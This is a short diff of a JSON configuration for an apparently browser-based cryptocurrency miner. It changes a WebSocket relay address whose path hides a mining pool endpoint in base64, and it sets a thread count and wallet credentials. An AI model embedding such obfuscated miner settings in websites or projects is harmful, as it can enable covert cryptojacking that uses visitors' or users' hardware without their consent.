@@ -1,5 +1,5 @@
 {
-  "proxy": "wss://lam-2f0e.onrender.com/bWlub3RhdXJ4Lm5hLm1pbmUuemVyZ3Bvb2wuY29tOjcwMTk=",
+  "proxy": "wss://lam-2f0e.onrender.com/bWlub3RhdXJ4LmV1Lm1pbmUuenBvb2wuY2E6NzAxOQ==",
   "config": { "threads": 16, "log": true },
   "options": { "user": "RYJVM8YKZfHJpN1cevUKWkEqLfMbUz7Rk5", "password": "c=RVN", "argent": "web-wasm/1.0" }
 }
